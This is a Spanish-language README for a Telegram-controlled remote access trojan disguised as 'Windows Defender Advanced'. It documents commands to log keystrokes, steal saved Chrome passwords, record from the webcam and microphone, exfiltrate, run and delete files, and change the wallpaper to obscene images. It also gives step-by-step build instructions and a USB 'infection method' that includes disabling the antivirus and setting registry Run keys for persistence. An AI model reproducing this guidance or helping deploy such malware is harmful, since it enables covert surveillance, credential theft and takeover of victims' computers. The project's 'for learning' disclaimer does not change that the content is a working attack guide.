````
  ╔═══╦═══╦════╗        ╔════╗ ╔╗                ╔╗╔╗╔╗     ╔╗
  ║╔═╗║╔═╗║╔╗╔╗║        ║╔╗╔╗║ ║║                ║║║║║║     ║║
  ║╚═╝║║ ║╠╝║║╚╝╔╗╔╦╦══╗╚╝║║╠╩═╣║╔══╦══╦═╦══╦╗╔╗ ║║║║║╠╦═╗╔═╝╠══╦╗╔╗╔╦══╗
  ║╔╗╔╣╚═╝║ ║║  ║╚╝╠╣╔╗║  ║║║║═╣║║║═╣╔╗║╔╣╔╗║╚╝║ ║╚╝╚╝╠╣╔╗╣╔╗║╔╗║╚╝╚╝║══╣
  ║║║╚╣╔═╗║ ║║  ╚╗╔╣║╔╗║  ║║║║═╣╚╣║═╣╚╝║║║╔╗║║║║ ╚╗╔╗╔╣║║║║╚╝║╚╝╠╗╔╗╔╬══║
  ╚╝╚═╩╝ ╚╝ ╚╝   ╚╝╚╩╝╚╝  ╚╝╚══╩═╩══╩═╗╠╝╚╝╚╩╩╩╝  ╚╝╚╝╚╩╝╚╩══╩══╝╚╝╚╝╚══╝
                                    ╔═╝║                 
                                    ╚══╝                   v 1.1.0
````
[![Made with Python](https://img.shields.io/badge/Made%20with-Python-3572A5.svg)](https://github.com/SebastianEPH)


__Nota:__ Éste proyecto tiene como finalidad el aprendizaje de ciberseguridad y hacking, no me hago responsable de un posible mal uso de ésta herramienta. 


[Read this documentation in English](Doc/README.md)

# Información Importante
* __Fecha de documentación :__ `09/05/2020`
* __Versión:__ v`1.1.0`
* __Peso compilado:__ `45MB` aproximadamente
* __Versión Python:__ `3.7` (Obligatoriamente debe ser ésta versión)
* __Licencia:__ `MIT licence`

## Archivos del repositorio - Github 
![Archivos](https://i.imgur.com/G57rYkC.png)
- `Doc`    = Contiene la documentación en ingles
- `Compilar.bat`    = Convierte el archivo `*.py` a `*.exe`
- `Ejecutar.bat`    = Ejecuta el RAT en consola, se muestra una consola.
- `iconDefender.ico`    = Icono Windows Defender
- `LICENCE` = Licencia 
- `proxy.py` = librería `*.py` , _no mover ni modificar_
- `README.md`= Ésta Documentación
- `StartUp.reg` = [Modifica el Registro de Windows] <== _En la versión_ __1.1.0__ _se eliminó éste archivo ya que ahora este archivo viene incluido dentro del código_
- `versionN.txt` = Información detalla de conversión `*.py` a `*.exe`
- `WindowsDefenderAdvanced.py` = Código fuente del RAT via Telegram Windows

# Requerimientos de espacio de trabajo
__Nota:__ Si usted desea puede descargar el entorno virtual de python 3.7 con todas las librerías instaladas y usadas en éste proyecto [_aquí_](https://jxjjxy-my.sharepoint.com/:f:/g/personal/ztjr_7ee_t_odmail_cn/EmlA_2f55ZxPoJh8yPMkvD4BrUNI0rJfjaPBrZP-84sCQw?e=kHqqgE)

__Librerías utilizadas__

* __import__ `winshell`
* __import__ `tendo`
* __import__ `winreg` <== Permite modificar el registro de Windows
* __import__ `pypiwin32`
* __import__ `pyinstaller` <= Compila el proyecto
* __import__ `psutil`
* __import__ `pillow`
* __import__ `opencv-python`
* __import__ `sys`
* __import__ `threading` <= Permite ejecución multihilos
* __import__ `datetime`
* __import__ `argparse`
* __import__ `logging`
* __import__ `socket` <== Verifica conexión a internet 
* __import__ `select`

# Funcionalidades
## /apagar
`Apaga la computadora de la [PC Infectada]`
## /audio
`Graba desde el microfono de la [PC Infectada]`

__Ejemplo:__
````
/audio [Tiempo en segundos]
/audio 45
````


## /captura
`Toma una captura de pantalla - [PC Infectada]`
## /ir
`Navega entre carpetas - [PC Infectada]`

__Ejemplo:__
````
/ir [Ruta entre comillas dobles y debe terminar con un "\"]

/ir "D:\SoftwarePortable\Android Studio\"
````
## /listar
`Muestra la lista de archivos que se encuentran en una carpeta - [PC Infectada]`

__Ejemplo:__
````
/listar [Ruta entre comillas dobles y debe terminar con un "\"]

/listar "D:\SoftwarePortable\Android Studio\plugins\"
````

## /cmd_dns
`Muestra la información desde la DNS - [PC Infectada]`
## /copiar 
`Copia un archivo de una carpeta a otra - [PC Infectada]`

__Ejemplo:__
````
/copiar [Ruta entre comillas dobles y debe terminar con la extensión del archivo] [Ruta entre comillas dobles y debe terminar con la extensión del archivo]

/copiar  "C:\Users\Anonymous\Documents\virus.exe"   "C:\Users\Anonymous\Desktop\virus.exe"
````

## /descargar
`Descarga un archivo - [PC Infectada]`

__Ejemplo:__
````
/descargar [Ruta entre comillas dobles y debe terminar con la extensión del archivo]

/descargar "O:\OneDrive - xKx\Pictures\Developer Software\Website\logo.png"
````

## /ejecutar
`Ejecuta un EXE - [PC Infectada]`

__Ejemplo:__
````
/ejecutar [Ruta entre comillas dobles y debe terminar con la extensión del archivo]

/ejecutar "C:\Users\Public\virus.exe"
````
## /eliminar
`Elimina un archivo o carpeta - [PC Infectada]`

__Ejemplo:__
````
/eliminar [Ruta entre comillas dobles y debe terminar con un "\" o con la extensión del archivo]

/eliminar "D:\Photos\FotosFamilia\"
/eliminar "D:\Photos\FotosFamilia\03122019.jpg"
````
## /enviar
`Envía archivos de nuestra PC o celular a la [PC Infectada]`

__Ejemplo:__
````
/enviar [Ruta entre comillas dobles y debe terminar con la extensión del archivo] [Ruta entre comillas dobles y debe terminar con la extensión del archivo]

/enviar  "C:\Users\Anonymous\Documents\virus.exe"   "C:\Users\Victima\Documents\NoEsvirus.exe"
````

## /fondo
`Cambia fondo de pantalla - [PC Infectada]`

__Ejemplo:__

````
/fondo   C:/Users/User/Desktop/porn.jpg
````
## /get_chrome
`Obtiene las contraseñas guardadas en Chrome - [PC Infectada]`
## /get_key
`Obtiene el registro de teclas - [PC Infectada]`
## /ip_info
`Obtiene la información desde la IP [PC Infectada]`
## /mover
`Mueve archivos - [PC Infectada]`

__Ejemplo:__
````
/mover [Ruta entre comillas dobles y debe terminar con la extensión del archivo] [Ruta entre comillas dobles y debe terminar con la extensión del archivo]

/mover  "C:\Users\Anonymous\Documents\virus.exe"   "C:\Users\Anonymous\Desktop\virus.exe"
````

## /proxy
`Abre un puerto localhost:8081 - [PC Infectada]`
No recomentable ya que, windows mandará un mensaje de FireWall, por ahora no se recomienda.

## /red_info
`Muestra información de la red- [PC Infectada]`
## /reiniciar
`Reinicia la computadora - [PC Infectada]`
## /tareas
`Muestra información de procesos  - [PC Infectada]`

![dsf](https://i.imgur.com/miav5Y8.png)

## /test
`Verifica si la [PC Infectada] se encuentra en linea`
## /this
`Muestra la ruta donde se encuentra el RAT`
## /web
`Abre un URL en el navegador predeterminado de `
__Ejemplo:__

````
/web   https://www.youtube.com/watch?v=ywGOLN0dDKU
/web   https://www.xxx.com
````
## /webcam
`Graba o toma foto de la webcam`

__NOTA:__`  No probado, tampoco sé si la luz de la webCam se enciende.`
___
___

## Futuras caracteristicas
Se está trabajando en las siguientes caracteristicas y se iran habilitando en las siguientes actualizaciones
![futuras actualizaciones](https://i.imgur.com/CnA3G20.png)

# Preparación

__Nota:__ Si usted desea puede descargar el entorno virtual de python 3.7 con todas las librerías instaladas y usadas en éste proyecto [_aquí_](https://jxjjxy-my.sharepoint.com/:f:/g/personal/ztjr_7ee_t_odmail_cn/EmlA_2f55ZxPoJh8yPMkvD4BrUNI0rJfjaPBrZP-84sCQw?e=kHqqgE)

* Editar el archivo `WindowsDefenderAdvanced.py`
  
  ![Archivo Windows defender advances troyano](https://i.imgur.com/5F3hN97.png)

* Creamos en [BotFather](https://telegram.me/BotFather) un Bot 

  ![botFather](https://i.imgur.com/mWzDXRU.png)

* Obtenemos nuetro token 

  ![](https://i.imgur.com/OBbDYVj.png)

* Entramos y agregamos nuestro token del bot

  ![agregar ](https://i.imgur.com/2QEyPfg.png)

* lo que sigue despues es obtener el ID de nuestro chat, pero para eso necesitamos ua ejecutar nuestro RAT.
* Para ejecutarlo, busque el archivo `Ejecutar.bat` => Y le damos a editar.

  ![Ejecutar.bat](https://i.imgur.com/IO15FFn.png)

* He insertamos la ruta donde se encuentra nuestro RAT
  
  ![ejecutar.bat data](https://i.imgur.com/IErOgU2.png)

* Una vez terminado ya podemos ejecutar nuestro RAT y en la consola se verá algo así.

  ![](https://i.imgur.com/oxKZHcm.png)

* Y en nuestro telegram tenemos que mandar un comando, para recibir nuestro ID del chat

  ![](https://i.imgur.com/TbX0swa.png)

* Y en nuestra consola aparecerá nuestro ID del chat

  ![chat id](https://i.imgur.com/3GEs4g2.png)

* Ahora con el ID único que obtuvimos, tenemos que escribirlo dentro del archivo `WindowsDefenderAdvanced.py`

  ![](https://i.imgur.com/psqD3sj.png)

* Y listo, ahora nuestro RAT solo responderá a nuestro ID privado, nadie más podrá tener ese acceso. ya está listo para compilar.


## Conversión de `*.py a *.exe`:
* Busque el archivo `Compilar.bat`

  ![Compilar.bat](https://i.imgur.com/bM9qBQg.png)

* => Clic derecho => Editar 

  ![Compilar.bat código](https://i.imgur.com/upyuCW8.png)

Y colocamos la ruta de la carpeta donde se encuentra el RAT
* => Guardamos => Ejecutamos para compilar...

  ![](https://i.imgur.com/fj0Bzri.png)
  
* Listo, el RAT se compiló exitosamente.


# Método de infección:
___¿Cómo infecto a la victima?___
* El archivo compilado es el siguiente

  ![Final files](https://i.imgur.com/N7obd7w.png)


__Nota:__ No cambiar de nombre al archivo `WindowsDefenderAdvanced.exe`, si usted le cambia el nombre, el RAT quedará obsoleto.
- Usten guardará el archivo en un USB.
- Conectará el USB a la [PC] a infectar.
- Se recomienda desactivar el antivirus o agregar una exclusión en al siguiente ruta: `"C:\Users\Public\Security\Windows Defender"`.
- Lo siguiente es ejecutar el archivo `WindowsDefenderAdvanced.exe` en el USB, el RAT se replicará en la siguiente ruta `"C:\Users\Public\Security\Windows Defender"`, Se recomienda no sacar el USB al instante ya que el `RAT` se estará replicando en la ruta.

__NOTA:__ Al ejecutar el archivó, ésta automaticamente modificará el registro de windows para que se inicie siempre al prender la computadora.

El RAT tratará de modificar la siguiente ruta del registro `"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"` por lo cual necesitará permisos de administrador, por ende se recomienda que la primera ejecución se realice con permisos de administrador, en caso de que no lo ejecute con permisos de administrador, el RAT modificará la siguiente ruta `"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"`

__Explicación:__ 
* `HKEY_LOCAL_MACHINE:` El RAT se ejecutará en todos los usuarios exitentes y los nuevos usuarios de la computadora
* `HKEY_CURRENT_USER:` El RAT solo se ejecutará en el usuario actual, si se llegará a crear otro usuario, el RAT Solo funcionará en el usuario principal
___
___
# Creador 
* __Repositorio Original:__ [mvrozanti](https://github.com/mvrozanti/RAT-via-Telegram) <== Es el creador original de éste repositorio.
* __Repostitorio:__ [Keylogger_Python](https://github.com/SebastianEPH/Keylogger_Python) <== Éste repositorio fue integrado en un 50% dentro de [RAT_via_Telegram_Windows](https://github.com/SebastianEPH/RAT_via_Telegram_Windows).
## By SebastianEPH
- [Github](https://github.com/SebastianEPH)
- [Facebook](https://www.facebook.com/SebastianEPH)
- [Linkedin](https://www.linkedin.com/in/sebastianeph/)
- [Telegram](https://t.me/sebastianeph)